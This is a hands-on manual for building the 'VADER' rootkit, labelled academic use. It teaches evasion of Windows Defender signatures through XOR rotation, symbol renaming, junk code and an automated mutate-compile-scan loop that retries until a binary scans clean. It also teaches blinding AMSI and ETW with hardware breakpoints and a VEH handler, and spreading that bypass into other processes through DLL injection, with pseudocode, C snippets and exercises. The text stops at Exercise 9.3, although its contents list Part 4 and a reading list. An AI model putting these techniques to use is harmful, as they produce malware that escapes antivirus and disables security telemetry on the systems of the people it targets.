# VADER ROOTKIT — LEARNING MANUAL

## Guided Build: Signature Evasion, Polymorphism, and Process Injection

### Classification: UNCLASSIFIED // ACADEMIC USE ONLY
### Operator: VADER (george wu / 22DIV)
### Authorisation: Own hardware only. CSEC academic research.

---

## How to Use This Manual

This is a hands-on learning guide. It teaches the concepts you need to build the missing pieces of the VADER toolkit — automated signature evasion and process injection — by understanding what they are and why they work.

**This is not a copy-paste guide.** Each chapter explains the concept, shows the architecture, provides pseudocode, and then gives you exercises. You write the actual code. When you're ready to build, feed this document back as context and work through it step by step.

Every chapter connects back to the ASF framework:

> 1. Search for knowledge, not for 0-days
> 2. See the paths, see what blocks you, find a substitute way
> 3. Crash > leak memory > execute arbitrary code
> 4. To find crashes, you need fuzzing

---

## Table of Contents

- [Part 1: Understanding the Enemy](#part-1-understanding-the-enemy)
  - [Chapter 1: How Defender Detects](#chapter-1-how-defender-detects)
  - [Chapter 2: What Signatures Actually Match](#chapter-2-what-signatures-actually-match)
- [Part 2: Signature Evasion & Polymorphism](#part-2-signature-evasion--polymorphism)
  - [Chapter 3: XOR Encoding Deep Dive](#chapter-3-xor-encoding-deep-dive)
  - [Chapter 4: Beyond XOR — Polymorphic Techniques](#chapter-4-beyond-xor--polymorphic-techniques)
  - [Chapter 5: Building a Mutation Pipeline](#chapter-5-building-a-mutation-pipeline)
- [Part 3: Process Injection](#part-3-process-injection)
  - [Chapter 6: Why Injection Is Needed](#chapter-6-why-injection-is-needed)
  - [Chapter 7: Debug Registers — The Hardware Layer](#chapter-7-debug-registers--the-hardware-layer)
  - [Chapter 8: Injection Techniques](#chapter-8-injection-techniques)
  - [Chapter 9: Designing VADER's Injector](#chapter-9-designing-vaders-injector)
- [Part 4: Operational Architecture](#part-4-operational-architecture)
  - [Chapter 10: The Complete Kill Chain](#chapter-10-the-complete-kill-chain)
- [Exercises Index](#exercises-index)
- [Reading List](#reading-list)

---

# Part 1: Understanding the Enemy

> ASF Principle 1: "Search for knowledge, not for 0-days."
> Before you evade detection, understand how detection works.

## Chapter 1: How Defender Detects

Windows Defender's scan engine (mpengine.dll) processes files through a multi-stage pipeline. Understanding the stages tells you what you're actually fighting.

### The Scan Pipeline (Simplified)

```
INPUT FILE
    │
    ▼
[Stage 1: File Type ID]     ← Magic bytes, file extension, header parsing
    │
    ▼
[Stage 3: Signature Match]  ← Static byte-pattern matching against VDM database
    │                          This is what catches most malware.
    │                          If your binary matches a known pattern → DETECTED.
    │
    ▼
[Stage 5: PE Emulation]     ← Runs the binary in a lightweight emulator
    │                          Watches for suspicious API call sequences.
    │                          Example: VirtualAlloc → memcpy → CreateThread
    │
    ▼
[Stage 7: Container Extract] ← Opens archives (ZIP, RAR, CAB), extracts contents,
    │                           re-scans each extracted file from Stage 1.
    │                           Recursive. Nested ZIPs = nested scans.
    │
    ▼
[Stage 8: Script Deobfusc]  ← NScript engine. Deobfuscates JS/VBS/PS1.
    │                          Unrolls string concatenation, base64, char codes.
    │                          Then re-evaluates the deobfuscated script.
    │
    ▼
[Stage 10: Lua Rules]       ← Custom detection logic written in Lua.
    │                          Microsoft's analysts write these for new threats.
    │                          Flexible, hard to reverse, frequently updated.
    │
    ▼
[Stage 12: ML Classification] ← Machine learning model (cloud + local).
    │                            Scores the binary on features: imports, sections,
    │                            entropy, strings, structure.
    │
    ▼
VERDICT: CLEAN or DETECTED
```

### What This Means for You

- **Stage 3 (signatures)** is the primary detection layer for known malware. This is what XOR key rotation defeats.
- **Stage 5 (emulation)** watches behaviour, not bytes. If your code calls VirtualProtect + WriteProcessMemory in sequence, it's suspicious even if the strings are encrypted. This is why VADER uses hardware breakpoints (no VirtualProtect at all).
- **Stage 12 (ML)** scores structural features. A binary with high entropy, suspicious imports, and small size looks like malware regardless of the content. This is why compilation flags matter (/O1 produces different structural features than /O2).

### Key Insight

Static signatures are the easiest to beat and the most common detection method. Behavioural detection (emulation + ML) is harder to evade but also harder for Microsoft to deploy against novel techniques. VADER's HWBP approach bypasses both because:
1. No memory patching → no signature on the patch bytes
2. No VirtualProtect calls → no behavioural trigger
3. Uses CPU debug registers → invisible to user-mode inspection

---

## Chapter 2: What Signatures Actually Match

A Defender static signature is a byte pattern with optional wildcards. Think of it like a regex for binary data.

### Example Signature (Conceptual)

```
Rule: Trojan:Win32/VaderShell.A
Pattern: { 48 8D 0D ?? ?? ?? ?? E8 ?? ?? ?? ?? 48 89 C7 [5-20] C7 45 ?? 52 41 44 45 }
         └─ LEA RCX    ─┘ └─ CALL ──────┘ └─ MOV RDI ─┘         └─ "RADE" on stack ─┘
```

This would match any binary that:
1. Has a LEA RCX instruction followed by a CALL
2. Followed within 5-20 bytes by the bytes `52 41 44 45` (ASCII "RADE")

### What Changes the Pattern

If you XOR-encode "RADE" with key 0x52:
- R (0x52) XOR 0x52 = 0x00
- A (0x41) XOR 0x52 = 0x13
- D (0x44) XOR 0x52 = 0x16
- E (0x45) XOR 0x52 = 0x17

Now the bytes on disk are `00 13 16 17` instead of `52 41 44 45`. The signature no longer matches. But the code flow (LEA + CALL + MOV) is unchanged — if the signature included those instructions, you'd need to change the code structure too.

### Layers of Detection (What Beats What)

```
DETECTION LAYER          │ WHAT IT MATCHES              │ WHAT DEFEATS IT
─────────────────────────┼──────────────────────────────┼────────────────────────
Static byte patterns     │ Exact sequences in the       │ XOR key rotation,
                         │ binary on disk                │ string re-encoding
                         │                               │
Structural signatures    │ Code flow patterns            │ Code reordering,
                         │ (instruction sequences)       │ junk code insertion,
                         │                               │ compiler flag changes
                         │                               │
Import hashing           │ Which APIs the binary         │ Dynamic API resolution
                         │ imports (IAT)                 │ (GetProcAddress at
                         │                               │ runtime)
                         │                               │
Behavioural (emulation)  │ What the code DOES when       │ Anti-emulation checks,
                         │ run in sandbox                │ environmental keying,
                         │                               │ delayed execution
                         │                               │
ML classification        │ Statistical features          │ Padding, section
                         │ (entropy, size, imports,      │ manipulation, import
                         │ section names)                │ blending
```

### Exercise 1.1

Open one of the VADER source files (e.g., `dark_room_annotated.c`). Identify:
1. Which strings would appear in the binary on disk (after compilation)?
2. Which are XOR-encoded and which are plaintext?
3. If Defender signatured the plaintext strings, what would you change?

### Exercise 1.2

Run `scan_all.py` against the current binaries. Then modify ONE binary: change the XOR key, recompile, and re-scan. Did the result change? This is the empirical proof that XOR rotation defeats static signatures.

---

# Part 2: Signature Evasion & Polymorphism

> ASF Principle 2: "See the paths, see what blocks you, find a substitute way."
> When Defender blocks one encoding, the block itself reveals what it matched.

## Chapter 3: XOR Encoding Deep Dive

You already know XOR encoding from the existing codebase. This chapter takes it deeper.

### How XOR Encoding Works in VADER

Every vector encodes sensitive strings (function names, paths, tags) as byte arrays XOR'd with a key. At runtime, the code decodes them into a stack buffer.

**Encoding (build time):**
```
Original:  "AmsiScanBuffer"
Key:       0x41
Encoded:   each byte XOR 0x41
           A(0x41)^0x41=0x00, m(0x6D)^0x41=0x2C, s(0x73)^0x41=0x32, ...
Result:    {0x00, 0x2C, 0x32, 0x28, 0x12, 0x22, 0x20, 0x2D, ...}
```

**Decoding (runtime):**
```c
unsigned char enc[] = {0x00, 0x2C, 0x32, 0x28, ...};
char buf[64];
for (int i = 0; i < sizeof(enc); i++)
    buf[i] = enc[i] ^ 0x41;
// buf now contains "AmsiScanBuffer"
```

### Why Different Keys Per Vector

If V4 (key 0x52) and V7 (key 0x19) both encode "CreateFileW", the resulting byte arrays are completely different:

```
"CreateFileW" XOR 0x52 = {0x11, 0x20, 0x37, 0x33, 0x26, 0x37, ...}
"CreateFileW" XOR 0x19 = {0x5A, 0x6B, 0x7C, 0x78, 0x6D, 0x7C, ...}
```

If Defender builds a signature for the first pattern, it doesn't match the second. Signature isolation.

### Key Rotation: The First Defence

When Defender catches a component, your first response is key rotation:
1. Pick a new XOR key (any byte 0x01-0xFF)
2. Re-encode all strings with the new key
3. Update the key constant in the source
4. Recompile
5. Re-scan

This changes EVERY encoded byte in the binary. Defender's static signature no longer matches.

### Exercise 3.1: Manual Key Rotation

Take `vectors/v7_phantom_dll/phantom_dll_annotated.c`. The current XOR key is 0x19.

1. Find all XOR-encoded byte arrays in the source
2. Decode each one (XOR with 0x19) to get the original strings
3. Pick a new key (e.g., 0xBB)
4. Re-encode each string with the new key
5. Update the key constant
6. Compile and scan

**Python helper for encoding:**
```python
def xor_encode(plaintext, key):
    return ", ".join(f"0x{b ^ key:02X}" for b in plaintext.encode())

# Example:
print(xor_encode("AmsiScanBuffer", 0xBB))
```

### Exercise 3.2: Batch Encoder

Write a Python script that:
1. Takes a list of strings and a key as input
2. Outputs C-formatted XOR-encoded arrays for each
3. Includes the null terminator (XOR'd)

This is the building block for automation.

---

## Chapter 4: Beyond XOR — Polymorphic Techniques

XOR key rotation defeats static byte-pattern signatures. But Defender has other detection layers. To evade them, you need deeper mutations.

### Technique 1: Variable Name Randomisation

Compiler output includes symbol names in debug info and sometimes in the binary itself. Even without debug info, function names in DLL exports are visible.

**Before:**
```c
void DarkRoomHandler(PEXCEPTION_POINTERS ex) { ... }
FARPROC pAmsiScanBuffer = NULL;
```

**After randomisation:**
```c
void ServiceMonitorCallback(PEXCEPTION_POINTERS ex) { ... }
FARPROC pValidateInput = NULL;
```

Same code, different symbols. The name "DarkRoomHandler" is a signature in itself.

**Limitation:** Internal variable names (local variables, function parameters) usually don't survive compilation to release binaries. This matters most for exported DLL functions and global symbols.

### Technique 2: Code Reordering

Compilers emit functions in the order they appear in source. Defender can signature the ORDER of functions, not just their content.

**Before:**
```
setup_veh()
resolve_targets()
set_breakpoints()
verify_bypass()
```

**After reordering:**
```
verify_bypass()
set_breakpoints()
setup_veh()
resolve_targets()
```

The binary has different code layout. Structural signatures break.

**How to implement:** Simply reorder functions in the source file. The compiler respects source order by default.

### Technique 3: Junk Code Insertion

Insert code that executes but does nothing meaningful. Changes the binary's instruction flow, entropy, and size — all features that ML models use.

```c
// Junk: appears to do computation but result is never used
volatile int _jnk = 0;
for (int i = 0; i < 3; i++) _jnk += i * 7;
```

**Caution:** Too much junk looks suspicious to ML. A few strategic insertions are better than filling the binary with noise.

### Technique 4: Compiler Flag Variation

Different optimisation levels produce different machine code for the same source:

```
/O1  → Minimise size (current VADER default)
/O2  → Maximise speed
/Ox  → Full optimisation
/Od  → No optimisation (debug)
```

Switching from /O1 to /O2 changes:
- Instruction selection (different opcodes for same operation)
- Register allocation (different registers used)
- Function inlining (some functions get inlined or not)
- Loop unrolling (different loop structures)

The result is a binary with different bytes, different structure, different hash — from the same source code.

### Technique 5: String Encoding Variation

Instead of single-byte XOR, use different encoding schemes:

- **Multi-byte XOR:** Key is 4+ bytes. Pattern repeats less.
- **ADD/SUB encoding:** `encoded[i] = plain[i] + key` instead of XOR.
- **Stack strings:** Build the string character by character with MOV instructions. No encoded array at all.
- **Hash-based resolution:** Don't store API names. Hash them. At runtime, walk the PEB/export table and compare hashes. The string never exists in the binary.

**Stack strings example (conceptual):**
```c
char buf[16];
buf[0] = 'C'; buf[1] = 'r'; buf[2] = 'e'; buf[3] = 'a';
buf[4] = 't'; buf[5] = 'e'; buf[6] = 'F'; buf[7] = 'i';
buf[8] = 'l'; buf[9] = 'e'; buf[10] = 'W'; buf[11] = '\0';
```

The compiler turns each assignment into a MOV instruction. No contiguous string in the binary.

### Exercise 4.1: Multi-Technique Mutation

Take any VADER source file. Apply ALL FIVE techniques:
1. Rename all meaningful variable/function names
2. Reorder the functions
3. Add 2-3 junk code blocks
4. Compile with /O2 instead of /O1
5. Use a new XOR key

Compare the binary hashes before and after. Run both through `scan_all.py`.

---

## Chapter 5: Building a Mutation Pipeline

This chapter teaches you how to design (and eventually build) an automated mutation tool. The pipeline takes a source file, applies mutations, compiles, and verifies evasion.

### Architecture

```
INPUT: source.c + current XOR key
           │
           ▼
    ┌──────────────┐
    │ PARSE SOURCE │  Extract: XOR arrays, key constant, function names
    └──────┬───────┘
           │
           ▼
    ┌──────────────┐
    │ MUTATE       │  Apply: new XOR key, rename symbols, reorder functions
    └──────┬───────┘
           │
           ▼
    ┌──────────────┐
    │ WRITE OUTPUT │  Write mutated source to temp file
    └──────┬───────┘
           │
           ▼
    ┌──────────────┐
    │ COMPILE      │  cl.exe with current flags
    └──────┬───────┘
           │
           ▼
    ┌──────────────┐
    │ SCAN         │  MpCmdRun.exe -Scan -ScanType 3 -File <binary>
    └──────┬───────┘
           │
           ├── CLEAN → Done. Save the mutation parameters.
           │
           └── DETECTED → Loop back to MUTATE with different parameters.
                          After N failures, escalate mutation depth.
```

### Pseudocode: The Core Loop

```
FUNCTION mutate_and_verify(source_path, output_name, max_attempts):
    original_key = extract_xor_key(source_path)
    
    FOR attempt IN 1 to max_attempts:
        // Pick mutation parameters
        new_key = random_byte(0x01, 0xFF, excluding=original_key)
        
        // Level 1: XOR rotation only (fast, usually sufficient)
        IF attempt <= 3:
            mutated = rotate_xor_key(source_path, original_key, new_key)
        
        // Level 2: XOR + symbol rename (medium)
        ELIF attempt <= 6:
            mutated = rotate_xor_key(source_path, original_key, new_key)
            mutated = rename_symbols(mutated)
        
        // Level 3: Full mutation (slow but thorough)
        ELSE:
            mutated = rotate_xor_key(source_path, original_key, new_key)
            mutated = rename_symbols(mutated)
            mutated = reorder_functions(mutated)
            mutated = insert_junk(mutated)
        
        // Compile
        success = compile(mutated, output_name)
        IF NOT success:
            CONTINUE  // compilation error, try different mutations
        
        // Scan
        result = scan(output_name)
        IF result == CLEAN:
            LOG("Clean at attempt {attempt}, key=0x{new_key:02X}")
            RETURN success, new_key, mutated
    
    RETURN failure  // all attempts detected
```

### Step 1: Parsing XOR Arrays (Exercise)

The first building block is extracting XOR-encoded arrays from C source code. These look like:

```c
unsigned char enc_funcname[] = {0x00, 0x2C, 0x32, 0x28, ...};
```

**Exercise 5.1:** Write a Python function `find_xor_arrays(source_text)` that:
- Uses regex to find all `unsigned char` array initialisers with hex byte lists
- Returns a list of: (variable_name, [byte_values], line_number)
- Handles multi-line arrays

**Hint:** The regex pattern `unsigned\s+char\s+(\w+)\[\]\s*=\s*\{([^}]+)\}` gets you started.

### Step 2: Decoding and Re-encoding (Exercise)

**Exercise 5.2:** Write a Python function `rotate_arrays(source_text, old_key, new_key)` that:
- Finds each XOR array (using your Exercise 5.1 function)
- Decodes each byte: `original = encoded_byte ^ old_key`
- Re-encodes: `new_encoded = original ^ new_key`
- Replaces the array in the source text
- Also replaces the XOR key constant definition

### Step 3: Compiling from Python (Exercise)

**Exercise 5.3:** Write a Python function `compile_source(source_path, output_path, flags)` that:
- Calls cl.exe via subprocess
- Handles the vcvars64.bat environment setup
- Returns True/False for success/failure
- Captures compiler output for error reporting

**Key challenge:** vcvars64.bat sets environment variables. You need to either:
- Run both commands in the same shell session
- Or extract the environment from vcvars and pass it to cl.exe

### Step 4: Scanning (Exercise)

**Exercise 5.4:** Write a Python function `scan_binary(binary_path)` that:
- Copies the binary to a temp directory (don't scan in place — Defender may quarantine)
- Runs MpCmdRun.exe with `-Scan -ScanType 3 -File <temp_copy> -DisableRemediation`
- Returns "CLEAN", "DETECTED", or "ERROR"
- Cleans up the temp copy

**Reference:** `tests/scan_all.py` already does this. Study it.

### Step 5: The Complete Pipeline (Exercise)

**Exercise 5.5:** Combine exercises 5.1-5.4 into a single script `mutate.py` that:
1. Takes a source file and output name as arguments
2. Extracts current XOR key
3. Generates a new random key
4. Rotates all XOR arrays
5. Compiles
6. Scans
7. Reports result
8. If detected, tries again with a different key (up to N attempts)

**Check your work:**
- Start with a CLEAN binary
- Manually change its XOR key to something that gets detected (unlikely but possible)
- Run your pipeline — it should iterate until it finds a clean key
- More realistically: run it on a CLEAN binary and verify it stays clean after mutation

---

# Part 3: Process Injection

> ASF Principle 2: "See the paths, see what blocks you, find a substitute way."
> The dark room works in its own process. The block: HWBP doesn't propagate to children.
> The substitute: inject the HWBP setup into the target process.

## Chapter 6: Why Injection Is Needed

### The Problem

When `dark_room.exe` runs:
1. It sets DR0 = address of AmsiScanBuffer
2. It sets DR1 = address of EtwEventWrite
3. It installs a VEH handler to catch the breakpoint exceptions
4. AMSI and ETW are now blind — **in this process only**

If dark_room spawns PowerShell:
```
dark_room.exe  ←  DR0/DR1 set, VEH installed, AMSI/ETW BLIND
    │
    └──→ powershell.exe  ←  DR0/DR1 NOT set, no VEH, AMSI/ETW ACTIVE
```

Child processes do NOT inherit:
- Debug register values (DR0-DR7 are per-thread, reset on new process)
- Vectored Exception Handlers (per-process registration)

So PowerShell can still scan scripts and report telemetry. The dark room only covers the room you're standing in.

### The Solution

Inject the HWBP setup into the target process. This means:
1. Open the target process
2. Install a VEH handler inside it (so breakpoint exceptions are caught)
3. Set DR0/DR1 on the target's threads (so breakpoints fire at the right addresses)

After injection:
```
dark_room.exe  ←  BLIND (own breakpoints)
    │
    └──→ powershell.exe  ←  BLIND (injected breakpoints + handler)
```

---

## Chapter 7: Debug Registers — The Hardware Layer

You already use debug registers in dark_room.c. This chapter goes deeper into how they actually work at the CPU level.

### The x64 Debug Register Set

```
DR0:  Breakpoint 0 address    ← VADER uses: AmsiScanBuffer
DR1:  Breakpoint 1 address    ← VADER uses: EtwEventWrite
DR2:  Breakpoint 2 address    ← Available (unused)
DR3:  Breakpoint 3 address    ← Available (unused)
DR4:  Reserved (alias for DR6)
DR5:  Reserved (alias for DR7)
DR6:  Debug Status Register   ← Which breakpoint fired
DR7:  Debug Control Register  ← Enable/disable, conditions, sizes
```

### DR7 Bit Layout (Critical to Understand)

DR7 is the control register. Its bits determine which breakpoints are active and how they trigger.

```
Bits 0-7:   Enable bits
  Bit 0:  L0 — Local enable for DR0 (set = active in current task)
  Bit 1:  G0 — Global enable for DR0
  Bit 2:  L1 — Local enable for DR1
  Bit 3:  G1 — Global enable for DR1
  Bit 4:  L2 — Local enable for DR2
  Bit 5:  G2 — Global enable for DR2
  Bit 6:  L3 — Local enable for DR3
  Bit 7:  G3 — Global enable for DR3

Bits 16-31: Condition and size for each breakpoint
  Bits 16-17: Condition for DR0
  Bits 18-19: Size for DR0
  Bits 20-21: Condition for DR1
  Bits 22-23: Size for DR1
  Bits 24-25: Condition for DR2
  Bits 26-27: Size for DR2
  Bits 28-29: Condition for DR3
  Bits 30-31: Size for DR3

Condition codes:
  00 = Execute (break on execution — what VADER uses)
  01 = Write (break on data write)
  10 = I/O (break on I/O access, rarely used)
  11 = Read/Write (break on data read or write)

Size codes (for execute breakpoints, must be 00):
  00 = 1 byte
  01 = 2 bytes
  10 = 8 bytes (x64 only)
  11 = 4 bytes
```

### How VADER Sets DR7

For VADER's use case (two execute breakpoints on DR0 and DR1):

```
DR7 needs:
  Bit 0 = 1    (L0: enable DR0 locally)
  Bit 2 = 1    (L1: enable DR1 locally)
  Bits 16-17 = 00  (DR0 condition: execute)
  Bits 18-19 = 00  (DR0 size: 1 byte)
  Bits 20-21 = 00  (DR1 condition: execute)
  Bits 22-23 = 00  (DR1 size: 1 byte)

DR7 = 0x00000005  (bits 0 and 2 set, everything else 0)
```

But in practice, you should preserve existing DR7 bits (other software might be using DR2/DR3):

```
new_dr7 = (old_dr7 & ~0x000F0005)  // Clear our bits
        | 0x00000005                // Set L0 and L1
        // Condition and size bits stay 00 (execute, 1 byte) — already zero
```

### Exercise 7.1: DR7 Calculation

Calculate the DR7 value for these scenarios:
1. One execute breakpoint on DR0 only
2. Two execute breakpoints on DR0 and DR1 (VADER's current setup)
3. Three execute breakpoints on DR0, DR1, and DR2
4. One execute breakpoint on DR0 and one data-write breakpoint on DR2 (4-byte watch)

### Exercise 7.2: Read dark_room.c

Open `dark_room/dark_room_annotated.c` and find:
1. Where DR7 is calculated
2. Where DR0 and DR1 are set
3. How the VEH handler determines which breakpoint fired
4. What the handler does when each breakpoint fires (what return value does it set?)

---

## Chapter 8: Injection Techniques

There are several ways to run code inside another process. Each has trade-offs.

### Technique 1: CreateRemoteThread

The classic. Allocate memory in the target, write your code there, create a thread to execute it.

**Flow:**
```
YOUR PROCESS                              TARGET PROCESS
    │                                          │
    │ OpenProcess(PROCESS_ALL_ACCESS, pid) ──→ │
    │                                          │
    │ VirtualAllocEx(handle, size, RWX)  ────→ │ [memory allocated]
    │                                          │
    │ WriteProcessMemory(handle, addr, code) → │ [code written]
    │                                          │
    │ CreateRemoteThread(handle, addr)  ─────→ │ [thread starts]
    │                                          │ [your code runs]
```

**Windows APIs involved:**
- `OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID)` — Get a handle to the target
- `VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)` — Allocate memory inside target
- `WriteProcessMemory(hProcess, remoteAddr, localBuffer, size, NULL)` — Write code/data into allocated memory
- `CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteAddr, param, 0, NULL)` — Start a thread at the written code

**Pros:** Simple, well-documented, reliable.
**Cons:** Heavily monitored by EDR/AV. The API call sequence (VirtualAllocEx + WriteProcessMemory + CreateRemoteThread) is a classic detection signature.

### Technique 2: APC Injection

Queue an Asynchronous Procedure Call (APC) to a thread in the target. The APC runs when the thread enters an alertable wait state.

**Flow:**
```
YOUR PROCESS                              TARGET PROCESS
    │                                          │
    │ OpenProcess + VirtualAllocEx + Write ──→ │ [payload written]
    │                                          │
    │ OpenThread(thread_id)  ────────────────→ │
    │                                          │
    │ QueueUserAPC(remoteAddr, hThread, 0) ──→ │ [APC queued]
    │                                          │
    │ ... wait ...                             │ [thread enters alertable wait]
    │                                          │ [APC fires]
    │                                          │ [your code runs]
```

**Key API:** `QueueUserAPC(pfnAPC, hThread, dwData)` — Queue a function to run on a specific thread

**Pros:** No CreateRemoteThread call. Uses an existing thread.
**Cons:** The target thread must enter an alertable wait (SleepEx, WaitForSingleObjectEx, etc.). If it never does, the APC never fires.

### Technique 3: Thread Context Manipulation

Suspend a thread, modify its instruction pointer (RIP) to point at your code, resume. The thread "wakes up" executing your payload.

**Flow:**
```
YOUR PROCESS                              TARGET PROCESS
    │                                          │
    │ VirtualAllocEx + WriteProcessMemory ───→ │ [payload written]
    │                                          │
    │ SuspendThread(hThread)  ───────────────→ │ [thread suspended]
    │                                          │
    │ GetThreadContext(hThread, &ctx)           │
    │ ctx.Rip = remotePayloadAddr              │
    │ SetThreadContext(hThread, &ctx) ────────→ │ [RIP modified]
    │                                          │
    │ ResumeThread(hThread)  ────────────────→ │ [thread resumes at payload]
```

**Key APIs:**
- `SuspendThread(hThread)` / `ResumeThread(hThread)` — Pause/resume
- `GetThreadContext(hThread, &context)` — Read registers (including RIP, DR0-DR7)
- `SetThreadContext(hThread, &context)` — Write registers

**Pros:** No new threads, no APC queue. Modifies existing execution flow.
**Cons:** You must save and restore the original RIP, or the thread crashes after your code runs. More complex to implement correctly.

### Technique 4: SetThreadContext for Debug Registers Only

This is a special case relevant to VADER. You don't need to inject shellcode — you just need to modify DR0, DR1, and DR7. SetThreadContext can do this without writing any code into the target.

**BUT:** You still need a VEH handler in the target process. Without it, when the hardware breakpoint fires, the target gets an unhandled SINGLE_STEP exception and crashes.

So VADER's injector needs BOTH:
1. Inject and register a VEH handler (requires code injection)
2. Set DR0/DR1/DR7 (just SetThreadContext)

### Exercise 8.1: API Research

Look up each of these on Microsoft's documentation (learn.microsoft.com):
1. `OpenProcess` — What access rights do you need? What's `PROCESS_ALL_ACCESS`?
2. `VirtualAllocEx` — What's the difference between `MEM_COMMIT` and `MEM_RESERVE`? Why use both?
3. `WriteProcessMemory` — What happens if the target address isn't writable?
4. `CreateRemoteThread` — What does the `lpParameter` argument do?
5. `GetThreadContext` / `SetThreadContext` — What flags control which register groups are read/written?

### Exercise 8.2: Thread Enumeration

Before you can modify threads, you need to find them. Windows provides the Tool Help library:

**Key APIs:**
- `CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)` — Snapshot all threads in the system
- `Thread32First(hSnapshot, &te)` / `Thread32Next(hSnapshot, &te)` — Iterate threads
- `THREADENTRY32.th32OwnerProcessID` — Which process owns this thread

**Exercise:** Write pseudocode for a function `enumerate_threads(target_pid)` that returns a list of thread IDs belonging to a specific process.

---

## Chapter 9: Designing VADER's Injector

This chapter pulls everything together into the design for VADER's Phase 4.

### What VADER's Injector Needs to Do

```
FUNCTION vader_inject(target_pid):

    STEP 1: Resolve target addresses
        Find AmsiScanBuffer address in target process
        Find EtwEventWrite address in target process
        (These may be at different addresses than in our process
         due to ASLR — but DLLs shared across processes are
         mapped at the same base, so usually the same)
    
    STEP 2: Inject VEH handler
        Allocate RWX memory in target (VirtualAllocEx)
        Write the handler function code (WriteProcessMemory)
        Register it (call AddVectoredExceptionHandler remotely)
    
    STEP 3: Set hardware breakpoints on all threads
        FOR EACH thread IN enumerate_threads(target_pid):
            SuspendThread(thread)
            GetThreadContext(thread)  // with CONTEXT_DEBUG_REGISTERS
            Set DR0 = AmsiScanBuffer address
            Set DR1 = EtwEventWrite address
            Set DR7 = enable DR0 + DR1 as execute breakpoints
            SetThreadContext(thread)
            ResumeThread(thread)
    
    STEP 4: Verify
        (Optional) Trigger AMSI in target to confirm bypass works
```

### The ASLR Question

ASLR (Address Space Layout Randomisation) randomises where DLLs load in memory. But on Windows, DLLs that are already loaded when a process starts share the same base address across all processes (because they're memory-mapped from the same file).

This means:
- `ntdll.dll` loads at the same address in every process on the same boot
- `amsi.dll` loads at the same address in every process that loads it

So the address of AmsiScanBuffer in dark_room.exe is the SAME as in powershell.exe (on the same boot). After reboot, it changes, but it's the same everywhere within a session.

**Implication:** You can resolve the address in your own process and use it for the target.

### The VEH Handler Problem

The hardest part of VADER's injector is installing the VEH handler remotely. The handler needs to:
1. Check if the exception is SINGLE_STEP (STATUS_SINGLE_STEP = 0x80000004)
2. Check if RIP matches DR0 (AmsiScanBuffer) or DR1 (EtwEventWrite)
3. Set the return value (RAX) appropriately
4. Clear the Resume Flag in EFLAGS
5. Return EXCEPTION_CONTINUE_EXECUTION

This is machine code that must run inside the target. You have two options:

**Option A: DLL injection + VEH registration**
Write the handler as a DLL. Inject the DLL (via LoadLibrary + CreateRemoteThread). The DLL's DllMain registers the VEH handler and returns. Cleanest approach.

**Option B: Shellcode injection**
Write the handler as position-independent code (shellcode). Write it into the target. Create a remote thread that calls AddVectoredExceptionHandler with a pointer to your shellcode. More complex but avoids dropping a DLL to disk.

### Architecture Decision

For VADER, **Option A (DLL injection)** is recommended because:
- The VEH handler code is already written (dark_room.c's handler)
- Compiling it as a DLL is trivial
- LoadLibrary-based injection is well-understood
- The DLL can also set the debug registers in DllMain, combining Steps 2 and 3

**The injection DLL would:**
```
DllMain(DLL_PROCESS_ATTACH):
    1. Resolve AmsiScanBuffer address
    2. Resolve EtwEventWrite address
    3. Register VEH handler (AddVectoredExceptionHandler)
    4. Set DR0, DR1, DR7 on the current thread
    5. Return TRUE
```

Then the injector just needs to force-load this DLL into the target process.

### Classic DLL Injection Flow (Pseudocode)

```
FUNCTION inject_dll(target_pid, dll_path):
    
    // Open target process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid)
    
    // Allocate memory for the DLL path string
    path_len = length(dll_path) + 1  // include null terminator
    remote_path = VirtualAllocEx(hProcess, NULL, path_len,
                                 MEM_COMMIT | MEM_RESERVE,
                                 PAGE_READWRITE)
    
    // Write the DLL path into target's memory
    WriteProcessMemory(hProcess, remote_path, dll_path, path_len, NULL)
    
    // Get the address of LoadLibraryA in kernel32.dll
    // (Same address in all processes — shared DLL)
    hKernel32 = GetModuleHandle("kernel32.dll")
    pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA")
    
    // Create a remote thread that calls LoadLibrary(our_dll_path)
    hThread = CreateRemoteThread(hProcess, NULL, 0,
                                  pLoadLibrary, remote_path,
                                  0, NULL)
    
    // Wait for the DLL to load
    WaitForSingleObject(hThread, INFINITE)
    
    // Cleanup
    VirtualFreeEx(hProcess, remote_path, 0, MEM_RELEASE)
    CloseHandle(hThread)
    CloseHandle(hProcess)
```

When this runs, the target process calls `LoadLibrary("C:\\path\\to\\vader_inject.dll")`, which loads the DLL, which triggers DllMain, which sets up the HWBP + VEH. The target process is now blind.

### Exercise 9.1: Design the Injection DLL

**STATUS: BUILT — see `injection/vader_inject_dll_annotated.c` for the implementation.**

Based on `dark_room_annotated.c`, design (on paper or in pseudocode) what `vader_inject.dll` would contain:

1. What goes in DllMain?
2. What's the VEH handler function?
3. How does it resolve AmsiScanBuffer if amsi.dll isn't loaded yet in the target?
4. What if the target process creates new threads AFTER injection? (Hint: new threads don't inherit DR values)

Compare your design to the actual implementation. Key decisions to study:
- How DllMain handles amsi.dll resolution with `tryLoad=1` under loader lock
- The VdrWatch export pattern for persistent thread monitoring
- The `blind_all_threads` function with self-TID skip

### Exercise 9.2: Design the Injector

**STATUS: BUILT — see `injection/vader_inject_annotated.c` for the implementation.**

Design the injector program (`vader_inject.exe`) that:
1. Takes a target PID as command-line argument
2. Opens the target process
3. Injects the DLL using the LoadLibrary technique
4. Verifies the injection succeeded
5. Reports result

What error conditions should it handle? What happens if OpenProcess fails (insufficient privileges)?

Compare your design to the actual implementation. Key decisions to study:
- `get_remote_module` using TH32CS_SNAPMODULE instead of GetExitCodeThread (64-bit truncation fix)
- VdrWatch RVA offset calculation via DONT_RESOLVE_DLL_REFERENCES local load
- The `--spawn` mode with CREATE_SUSPENDED

### Exercise 9.3: The New Thread Problem

**STATUS: SOLVED — VdrWatch periodic re-enumeration was chosen.**

When a process creates a new thread after injection, that thread has clean DR0-DR7 (all zeros). The VEH handler is still registered (process-wide), but no breakpoints will fire on the new thread.

**Design challenge:** How would you ensure new threads also get the breakpoints set? Research:
- `NtSetInformationThread` with `ThreadHideFromDebugger`
- Thread creation callbacks (not available from user mode)
